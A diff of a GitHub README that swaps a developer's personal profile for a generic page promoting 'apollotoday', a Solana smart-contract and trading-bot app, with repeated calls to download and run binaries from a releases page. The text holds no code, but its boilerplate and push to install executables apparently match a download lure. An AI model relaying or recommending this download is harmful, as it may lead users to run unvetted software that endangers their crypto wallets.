@@ -1,10 +1,81 @@
-<h1 align="center">✩ 𝑹𝒖𝒔𝒕 & 𝗦𝗺𝗮𝗿𝘁 𝗖𝗼𝗻𝘁𝗿𝗮𝗰𝘁 𝗘𝗻𝗴𝗶𝗻𝗲𝗲𝗿 ✩</h1>
+# 🚀 apollotoday - Your Gateway to Solana Smart Contracts
 
-<p align="left">
-  ✨ Rust & DeFi Protocol Engineer | AI Agent Builder <br>
-  ✨ Protocol Engineer • AI Agent Dev • Onchain Innovator <br>
-  ✨ Hardcore Rust Engineer | DeFi Protocols & AI Agents <br>
-  ✨ Rust & Yul Trading Bots Builder <br>
-  ⚠️(My aged github was suspended by github team, so lost valuable projects. Keep valuable product well on ur VPS.)
-</p>
-<img width="1536" height="1024" alt="ChatGPT Image Sep 9, 2025, 03_52_03 PM" src="https://github.com/user-attachments/assets/70f74879-8f3a-41c6-814b-e82356e6b60f" />
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Zeagalf/apollotoday/releases)  
+Visit this page to download the latest version of apollotoday.
+
+## 🚀 Getting Started
+Welcome to apollotoday! This application helps you work with Solana smart contracts effortlessly. You don’t need any programming knowledge to get started.
+
+## 🖥️ System Requirements
+Before you download, make sure you have:
+- A computer running Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- A stable internet connection.
+- Python 3.x installed (if you want to use the developer features).
+
+## 📂 Features
+- **Smart Contract Development**: Create and deploy Solana smart contracts with ease.
+- **Trading Bots**: Develop bots for trading on Solana networks.
+- **User-Friendly Interface**: Simple and clean design for easy navigation.
+- **Comprehensive Tools**: Access various tools for efficient development and deployment.
+
+## 📥 Download & Install
+To get started, follow these steps:
+
+1. **Visit the Releases Page**: Click the link below to go to the releases page.
+   [Download the Latest Version](https://github.com/Zeagalf/apollotoday/releases)
+
+2. **Select the Right Version**: Look for the most recent version. It will usually have a version number like `v1.2.3`.
+
+3. **Choose Your File**: Depending on your operating system, select the correct file:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+
+4. **Download the File**: Click on the file name to begin downloading.
+
+5. **Install the Software**:
+   - **Windows**: Run the downloaded `.exe` file and follow the prompts.
+   - **macOS**: Open the `.dmg` file, drag the app into your Applications folder.
+   - **Linux**: Extract the `.tar.gz` file and read the included instructions for installation.
+
+6. **Launch apollotoday**: Once installation is complete, open the application.
+
+## 📊 Using the Application
+Once you have installed apollotoday, you can begin developing Solana smart contracts and using trading bots. Here’s how to get started:
+
+1. **Create a New Project**: Open the app and select "Create New Project".
+2. **Follow the Guidelines**: The app will guide you through setting up your project.
+3. **Access Tools**: Use the built-in tools to develop, test, and deploy your contracts.
+
+## 🎓 Learning Resources
+To help you along the way, we provide several resources:
+
+- **User Guide**: A detailed user manual is included in the application.
+- **Tutorial Videos**: Short videos demonstrate features and tools.
+- **Community Support**: Join our discussions in community forums for tips and help.
+
+## 🛠️ Additional Support
+If you encounter issues, please reach out through our issue tracker on GitHub. Our team is here to help you troubleshoot problems and answer your questions.
+
+## 📞 Contact
+For further assistance or inquiries, feel free to contact us at support@apollotoday.com.
+
+## 🔗 Additional Links
+Check out other resources:
+- [Official Documentation](https://github.com/Zeagalf/apollotoday/wiki)
+- [Join Our Community](https://discord.gg/apollotoday)
+
+## 🔄 FAQs
+**How to Update the Application?**
+To update, revisit the releases page, download the latest version, and follow the installation steps again.
+
+**Is There a Mobile Version?**
+Currently, there is no mobile version available. We focus on desktop applications for optimal performance.
+
+**Can I Contribute?**
+Absolutely! Contributions are welcome. Please refer to our contributing guide in the repository for more information.
+
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Zeagalf/apollotoday/releases)  
+Visit this page to download the latest version of apollotoday.
